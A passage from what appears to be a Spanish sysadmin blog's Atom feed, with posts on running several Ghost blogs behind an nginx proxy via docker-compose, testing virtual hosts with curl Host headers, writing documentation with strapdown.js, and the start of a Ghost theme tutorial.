&lt;p&gt;El &lt;em&gt;docker-compose.yml&lt;/em&gt; no tiene ningún misterio en sí mismo. Solo hay que tener en cuenta que necesitamos indicar las variables de entorno necesarias y que el &lt;em&gt;proxy&lt;/em&gt; no se puede levantar antes que los &lt;em&gt;blogs&lt;/em&gt;. Esto es porque &lt;strong&gt;nginx&lt;/strong&gt; se cae si no puede resolver el nombre de las máquinas que forman parte de su configuración.&lt;/p&gt;
&lt;p&gt;Así quedaría el &lt;em&gt;docker-compose.yml&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/multighost$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  proxy:
    build: proxy
    depends_on:
      - ghost1
      - ghost2
    links:
      - ghost1
      - ghost2
    ports:
      - &lt;span class="s2"&gt;&amp;quot;80:80&amp;quot;&lt;/span&gt;
    environment:
      - &lt;span class="nv"&gt;DOMAINS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;ghost1.my,multighost_ghost1_1&lt;span class="p"&gt;;&lt;/span&gt;ghost2.my,multighost_ghost2_1
  ghost1:
    build: ghost_blog
    expose:
      - &lt;span class="m"&gt;2368&lt;/span&gt;
    environment:
      - &lt;span class="nv"&gt;NODE_ENV&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;production
      - &lt;span class="nv"&gt;GHOST_URL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;http://ghost1.my
  ghost2:
    build: ghost_blog
    expose:
      - &lt;span class="m"&gt;2368&lt;/span&gt;
    environment:
      - &lt;span class="nv"&gt;NODE_ENV&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;production
      - &lt;span class="nv"&gt;GHOST_URL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;http://ghost2.my
gerard@sirius:~/docker/multighost$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Levantando el entorno&lt;/h2&gt;
&lt;p&gt;Esto no supone ningún misterio; usaremos los mismo comandos de &lt;strong&gt;docker-compose&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/multighost$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;multighost_default&amp;quot;&lt;/span&gt; with the default driver
Building ghost1
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM ghost
 ---&amp;gt; c8799e5d02e1
Step &lt;span class="m"&gt;2&lt;/span&gt; : COPY config.js /usr/src/ghost/config.example.js
 ---&amp;gt; a59babea33ac
Removing intermediate container 4afdb804e150
Successfully built a59babea33ac
Creating multighost_ghost1_1
Building ghost2
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM ghost
 ---&amp;gt; c8799e5d02e1
Step &lt;span class="m"&gt;2&lt;/span&gt; : COPY config.js /usr/src/ghost/config.example.js
 ---&amp;gt; Using cache
 ---&amp;gt; a59babea33ac
Successfully built a59babea33ac
Creating multighost_ghost2_1
Building proxy
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM alpine:3.4
 ---&amp;gt; 7d23b3ca3463
Step &lt;span class="m"&gt;2&lt;/span&gt; : RUN apk add --no-cache nginx &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     ln -s /dev/stdout /var/log/nginx/access.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     ln -s /dev/stderr /var/log/nginx/error.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     mkdir /run/nginx
 ---&amp;gt; Running in aa6bdbca5088
fetch http://dl-cdn.alpinelinux.org/alpine/v3.4/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.4/community/x86_64/APKINDEX.tar.gz
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;/3&lt;span class="o"&gt;)&lt;/span&gt; Installing nginx-common &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.10.1-r1&lt;span class="o"&gt;)&lt;/span&gt;
Executing nginx-common-1.10.1-r1.pre-install
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;/3&lt;span class="o"&gt;)&lt;/span&gt; Installing pcre &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;.38-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;/3&lt;span class="o"&gt;)&lt;/span&gt; Installing nginx &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.10.1-r1&lt;span class="o"&gt;)&lt;/span&gt;
Executing busybox-1.24.2-r11.trigger
OK: &lt;span class="m"&gt;6&lt;/span&gt; MiB in &lt;span class="m"&gt;14&lt;/span&gt; packages
 ---&amp;gt; 6cb42f2e3eb3
Removing intermediate container aa6bdbca5088
Step &lt;span class="m"&gt;3&lt;/span&gt; : COPY nginx.conf /etc/nginx/
 ---&amp;gt; f6f9c012d7e4
Removing intermediate container 881e06b92225
Step &lt;span class="m"&gt;4&lt;/span&gt; : COPY generate_configs.sh entrypoint.sh /
 ---&amp;gt; aa0c311dec7d
Removing intermediate container f5351cfa8268
Step &lt;span class="m"&gt;5&lt;/span&gt; : ENTRYPOINT /entrypoint.sh
 ---&amp;gt; Running in cf8151378f7e
 ---&amp;gt; 7451c8ccbfe9
Removing intermediate container cf8151378f7e
Successfully built 7451c8ccbfe9
Creating multighost_proxy_1
gerard@sirius:~/docker/multighost$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ya tenemos nuestro entorno funcional.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/multighost$ docker-compose ps
       Name                   Command            State         Ports        
---------------------------------------------------------------------------
multighost_ghost1_1   /entrypoint.sh npm start   Up      &lt;span class="m"&gt;2368&lt;/span&gt;/tcp           
multighost_ghost2_1   /entrypoint.sh npm start   Up      &lt;span class="m"&gt;2368&lt;/span&gt;/tcp           
multighost_proxy_1    /entrypoint.sh             Up      &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:80-&amp;gt;80/tcp 
gerard@sirius:~/docker/multighost$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo faltaría abrir en un navegador y apuntar a &lt;a href="http://ghost1.my/"&gt;http://ghost1.my/&lt;/a&gt; y a &lt;a href="http://ghost2.my/"&gt;http://ghost2.my/&lt;/a&gt; para ver los resultados.&lt;/p&gt;
&lt;p&gt;Es importante notar que la topología del entorno se declara solamente en el &lt;em&gt;docker-compose.yml&lt;/em&gt;; en caso de poner mas &lt;em&gt;blogs&lt;/em&gt;, no hay que tocar otros ficheros. Bastaría con declarar un &lt;em&gt;ghost3&lt;/em&gt; y modificar las variables de entorno del &lt;em&gt;proxy&lt;/em&gt;, para que genere su configuración.&lt;/p&gt;
&lt;h2&gt;Esto no es el final&lt;/h2&gt;
&lt;p&gt;A partir de aquí, se pueden aplicar muchas mejoras. Por ejemplo:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Se podría levantar una base de datos &lt;strong&gt;mysql&lt;/strong&gt; (u otra) en el fichero &lt;em&gt;docker-compose.yml&lt;/em&gt;. El resto de instancias de &lt;strong&gt;Ghost&lt;/strong&gt; podrían conectarse a esta base de datos, pasando los parámetros de conexión como variables de entorno, con lo que habría que modificar el &lt;em&gt;config.js&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Otra posibilidad sería la de aprovecharnos de la capacidad de &lt;em&gt;escalar&lt;/em&gt; el número de contenedores. Modificando la variable de entorno &lt;em&gt;DOMAINS&lt;/em&gt; del &lt;em&gt;proxy&lt;/em&gt; y el &lt;em&gt;script&lt;/em&gt; generador de configuraciones &lt;em&gt;generate_configs.sh&lt;/em&gt;, se podría balancear cada dominio entre varios contenedores. Esto tendría sentido siempre y cuando la base de datos no sea &lt;strong&gt;sqlite&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;La lista de mejoras podría crecer indefinidamente, pero por brevedad lo vamos a dejar como ejercicio para el lector.&lt;/p&gt;</content><category term="ghost"></category><category term="blog"></category><category term="virtual hosts"></category></entry><entry><title>Probando virtualhosts con cabeceras HTTP</title><link href="http://www.linuxsysadmin.ml/2016/12/probando-virtualhosts-con-cabeceras-http.html" rel="alternate"></link><published>2016-12-19T08:00:00+01:00</published><updated>2016-12-19T08:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-12-19:/2016/12/probando-virtualhosts-con-cabeceras-http.html</id><summary type="html">&lt;p&gt;Algunas veces tenemos que montar servidores web que responden con distinto contenido dependiendo del dominio. En estas ocasiones, es posible usar un servidor DNS local o incluso resolviendo los dominios mediante el fichero &lt;em&gt;/etc/hosts&lt;/em&gt;. Sin embargo, hay una forma fácil, elegante y que no requiere modificar configuraciones del sistema …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Algunas veces tenemos que montar servidores web que responden con distinto contenido dependiendo del dominio. En estas ocasiones, es posible usar un servidor DNS local o incluso resolviendo los dominios mediante el fichero &lt;em&gt;/etc/hosts&lt;/em&gt;. Sin embargo, hay una forma fácil, elegante y que no requiere modificar configuraciones del sistema.&lt;/p&gt;
&lt;p&gt;La idea es muy fácil: se trata de suministrar la cabecera &lt;em&gt;Host&lt;/em&gt; con el dominio que queramos consultar, y el servidor web se va a comportar como si hubiéramos pedido ese &lt;em&gt;virtualhost&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;El escenario de ejemplo&lt;/h2&gt;
&lt;p&gt;Supongamos que tenemos un servidor web &lt;strong&gt;nginx&lt;/strong&gt; (por poner algún ejemplo). Este servidor está configurado con dos &lt;em&gt;server&lt;/em&gt; (lo que en &lt;strong&gt;apache&lt;/strong&gt; se llama &lt;em&gt;virtualhost&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Ambos se limitan a servir contenido estático, de diferentes carpetas, con la configuración siguiente:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/etc/nginx/conf.d &lt;span class="c1"&gt;# cat server1&lt;/span&gt;
server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    server_name server1&lt;span class="p"&gt;;&lt;/span&gt;
    root /srv/www/server1&lt;span class="p"&gt;;&lt;/span&gt;
    index index.html&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
/etc/nginx/conf.d &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y una configuración análoga para el otro &lt;em&gt;virtualhost&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/etc/nginx/conf.d &lt;span class="c1"&gt;# cat server2&lt;/span&gt;
server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    server_name server2&lt;span class="p"&gt;;&lt;/span&gt;
    root /srv/www/server2&lt;span class="p"&gt;;&lt;/span&gt;
    index index.html&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
/etc/nginx/conf.d &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por supuesto, vamos a poner contenido en las carpetas raíz de cada &lt;em&gt;virtualhost&lt;/em&gt;, para que podamos ver fácilmente lo que estamos sirviendo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/srv/www &lt;span class="c1"&gt;# cat server1/index.html &lt;/span&gt;
&amp;lt;h1&amp;gt;Hello from server1&amp;lt;/h1&amp;gt;
/srv/www &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y algo similar para el segundo dominio:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/srv/www &lt;span class="c1"&gt;# cat server2/index.html &lt;/span&gt;
&amp;lt;p&amp;gt;This comes from server2&amp;lt;/p&amp;gt;
/srv/www &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A partir de aquí, se asume que el servidor está recargado y corriendo.&lt;/p&gt;
&lt;h2&gt;Como se hace&lt;/h2&gt;
&lt;p&gt;Podemos hacer una petición directa con las herramientas que nos parezcan adecuadas, por ejemplo, &lt;strong&gt;wget&lt;/strong&gt;, &lt;strong&gt;curl&lt;/strong&gt; o un navegador normal; el único requisito es que podamos añadir cabeceras, de forma nativa o mediante un &lt;em&gt;plugin&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;La dirección IP usada es la que corresponda; incluso se puede usar &lt;em&gt;localhost&lt;/em&gt; si hacemos las pruebas desde la misma máquina.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ curl -s http://192.168.1.48/
&amp;lt;h1&amp;gt;Hello from server1&amp;lt;/h1&amp;gt;
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como vemos, obtenemos un resultado... ¿Pero cuál?&lt;/p&gt;
&lt;p&gt;No podemos saber &lt;em&gt;a priori&lt;/em&gt; de que dominio vamos a obtener las páginas. En este caso obtuvimos &lt;em&gt;server1&lt;/em&gt; porque &lt;strong&gt;nginx&lt;/strong&gt; suministra el primero que lee en las configuraciones. Pero eso no nos sirve.&lt;/p&gt;
&lt;p&gt;Nosotros queremos probar todos los dominios, uno por uno, y posiblemente de forma automatizada. Así, por ejemplo, si queremos el dominio &lt;em&gt;server1&lt;/em&gt;, basta con indicarlo en la cabecera &lt;em&gt;Host&lt;/em&gt; de la petición. Se añade el ejemplo con &lt;strong&gt;curl&lt;/strong&gt;, pero debería poder hacerse con cualquier cliente HTTP, de acuerdo a la documentación.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ curl -s -H &lt;span class="s2"&gt;&amp;quot;Host: server1&amp;quot;&lt;/span&gt; http://192.168.1.48/
&amp;lt;h1&amp;gt;Hello from server1&amp;lt;/h1&amp;gt;
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos queda pedir el otro dominio, y verificar que se nos está sirviendo &lt;em&gt;server2&lt;/em&gt;, demostrando que este truco funciona:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ curl -s -H &lt;span class="s2"&gt;&amp;quot;Host: server2&amp;quot;&lt;/span&gt; http://192.168.1.48/
&amp;lt;p&amp;gt;This comes from server2&amp;lt;/p&amp;gt;
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto vemos que nuestros &lt;em&gt;virtualhosts&lt;/em&gt; funcionan como deben. A partir de aquí, podemos enriquecer las configuraciones de acuerdo a nuestras necesidades.&lt;/p&gt;</content><category term="curl"></category><category term="virtual hosts"></category></entry><entry><title>Documentación fácil con markdown y strapdown.js</title><link href="http://www.linuxsysadmin.ml/2016/12/documentacion-facil-con-markdown-y-strapdownjs.html" rel="alternate"></link><published>2016-12-12T08:00:00+01:00</published><updated>2016-12-12T08:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-12-12:/2016/12/documentacion-facil-con-markdown-y-strapdownjs.html</id><summary type="html">&lt;p&gt;Últimamente estoy harto de realizar documentación en formato &lt;em&gt;word&lt;/em&gt;; pierdo la mayoría de mi tiempo dando formato, colores y maquetando el poco contenido que alcanzo a poner. Tras mucho meditar y, a partir de ahora, la voy a escribir en &lt;strong&gt;markdown&lt;/strong&gt;, y se lea en &lt;strong&gt;HTML&lt;/strong&gt;, como lenguaje mas usado …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Últimamente estoy harto de realizar documentación en formato &lt;em&gt;word&lt;/em&gt;; pierdo la mayoría de mi tiempo dando formato, colores y maquetando el poco contenido que alcanzo a poner. Tras mucho meditar y, a partir de ahora, la voy a escribir en &lt;strong&gt;markdown&lt;/strong&gt;, y se lea en &lt;strong&gt;HTML&lt;/strong&gt;, como lenguaje mas usado.&lt;/p&gt;
&lt;p&gt;Revisando por la web, he encontrado una librería magnífica que se llama &lt;a href="http://strapdownjs.com/"&gt;strapdown.js&lt;/a&gt;, que combina la elegancia de &lt;strong&gt;bootstrap&lt;/strong&gt; con un compilador &lt;strong&gt;markdown&lt;/strong&gt; de lado cliente. De esta forma, ni siquiera necesito hacer el paso previo de convertir mis ficheros &lt;strong&gt;markdown&lt;/strong&gt; a &lt;strong&gt;HTML&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Como plus extra, como el fichero se interpreta en el navegador, no necesito nada muy caprichoso en el servidor para servir las páginas; con un &lt;strong&gt;nginx&lt;/strong&gt; nos basta. Incluso podemos sacar partido de las &lt;a href="https://pages.github.com/"&gt;GitHub Pages&lt;/a&gt;, para tener &lt;em&gt;hosting&lt;/em&gt; gratuito.&lt;/p&gt;
&lt;p&gt;Las páginas son ficheros &lt;em&gt;.html&lt;/em&gt; estándares, con la única diferencia de que todo lo que vaya en el &lt;em&gt;tag xmp&lt;/em&gt; será interpretado como &lt;strong&gt;markdown&lt;/strong&gt;. Ahí pongo el esqueleto básico de una página.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Sin título&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;xmp&lt;/span&gt; &lt;span class="na"&gt;theme&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;spacelab&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;display:none;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
...
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;xmp&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://strapdownjs.com/v/0.2/strapdown.js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De hecho, el fichero incluido &lt;em&gt;strapdown.js&lt;/em&gt;, y el resto de ficheros necesarios se pueden alojar en nuestro mismo servidor, para una velocidad de acceso óptima.&lt;/p&gt;
&lt;h2&gt;Un ejemplo&lt;/h2&gt;
&lt;p&gt;Supongamos que queremos hacer una web de dos páginas: el índice y otra de ejemplo. Para ello vamos a poner dos ficheros &lt;strong&gt;HTML&lt;/strong&gt;, de la misma manera que lo haríamos para una página web normal.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/www$ ls -1
example.html
index.html
gerard@aldebaran:~/www$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Empezaremos creando un &lt;em&gt;index.html&lt;/em&gt; con el siguiente contenido:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Home page&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;xmp&lt;/span&gt; &lt;span class="na"&gt;theme&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;spacelab&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;display:none;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
# Hello world!

You are in the Home page.

Navigation:

* [Home page](/)
* [Example page](/example.html)
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;xmp&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://strapdownjs.com/v/0.2/strapdown.js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hemos puesto un enlace a la página de ejemplo, así que la vamos a crear también, para no tener enlaces rotos. Pongamos algo similar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Example page&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;xmp&lt;/span&gt; &lt;span class="na"&gt;theme&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;spacelab&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;display:none;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
# This is an example

You are in the example page.

Navigation:

* [Home page](/)
* [Example page](/example.html)
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;xmp&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://strapdownjs.com/v/0.2/strapdown.js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y no hay que hacer nada más. Solo hay que servir el contenido de esta carpeta. Podemos montar un servidor web o podemos sincronizarla a otro servidor que tengamos. Como no me quiero entretener con esto, y dado que no tiene nada que ver, me voy a limitar a levantar el servidor estándar que viene con &lt;strong&gt;python&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/www$ python -m SimpleHTTPServer
Serving HTTP on &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0 port &lt;span class="m"&gt;8000&lt;/span&gt; ...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto solo nos queda verificar el resultado en &lt;a href="http://localhost:8000/"&gt;http://localhost:8000/&lt;/a&gt;. Si miráis el código fuente de la página, veréis que se ve el lenguaje de marcado tal cual; incluso puede que veáis la página antes de su &lt;em&gt;renderizado&lt;/em&gt;, mientras se carga la librería &lt;strong&gt;javascript&lt;/strong&gt;. Al menos, habré cumplido con mi objetivo, que era el de escribir contenido sin perder tiempo en la maquetación.&lt;/p&gt;</content><category term="html"></category><category term="markdown"></category><category term="strapdownjs"></category></entry><entry><title>Creando un tema para Ghost</title><link href="http://www.linuxsysadmin.ml/2016/12/creando-un-tema-para-ghost.html" rel="alternate"></link><published>2016-12-05T08:00:00+01:00</published><updated>2016-12-05T08:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-12-05:/2016/12/creando-un-tema-para-ghost.html</id><summary type="html">&lt;p&gt;Ya vimos lo fácil que resulta de empezar un &lt;em&gt;blog&lt;/em&gt; con &lt;strong&gt;Ghost&lt;/strong&gt;. El tema que viene por defecto es muy simple y bastante legible, pero nos puede interesar cambiarlo, por ejemplo para poner publicidad. Existen temas de pago y gratuitos ya hechos, pero hoy voy a explicar como hacer uno …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ya vimos lo fácil que resulta de empezar un &lt;em&gt;blog&lt;/em&gt; con &lt;strong&gt;Ghost&lt;/strong&gt;. El tema que viene por defecto es muy simple y bastante legible, pero nos puede interesar cambiarlo, por ejemplo para poner publicidad. Existen temas de pago y gratuitos ya hechos, pero hoy voy a explicar como hacer uno.&lt;/p&gt;
&lt;p&gt;Vamos a partir de una instalación limpia de &lt;strong&gt;Ghost&lt;/strong&gt;, pero ejemplo como se indica en &lt;a href="http://www.linuxsysadmin.ml/2016/11/ghost-un-motor-para-hacer-blogs.html"&gt;otro artículo&lt;/a&gt;. Es especialmente importante desarrollar el tema en una instancia que corra en modo &lt;em&gt;development&lt;/em&gt;, así no va a &lt;em&gt;cachear&lt;/em&gt; las plantillas y nos va a ahorrar reiniciar el proceso.&lt;/p&gt;
&lt;p&gt;Es muy útil mapear la carpeta &lt;em&gt;/usr/lib/ghost/&lt;/em&gt; del contenedor a una carpeta local, si estamos usando &lt;strong&gt;Docker&lt;/strong&gt;. De esta manera podemos editar el tema cómodamente en nuestro sistema de ficheros y con las herramientas con las que más cómodos nos sintamos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace$ docker run -d -p &lt;span class="m"&gt;2368&lt;/span&gt;:2368 -v /home/gerard/workspace/content:/var/lib/ghost ghost
343d065878fb910a9f2b5b51be4a337d2e93db2e66cbff6800c2cb96a758f733
gerard@aldebaran:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Una vez hayamos creado el tema, nos lo podemos descargar y aplicarlo a nuestra instancia productiva, sin necesidad de reiniciar nada. A fin de cuentas, en el fichero &lt;em&gt;.zip&lt;/em&gt; solo hay plantillas y ficheros de respaldo del tema.&lt;/p&gt;
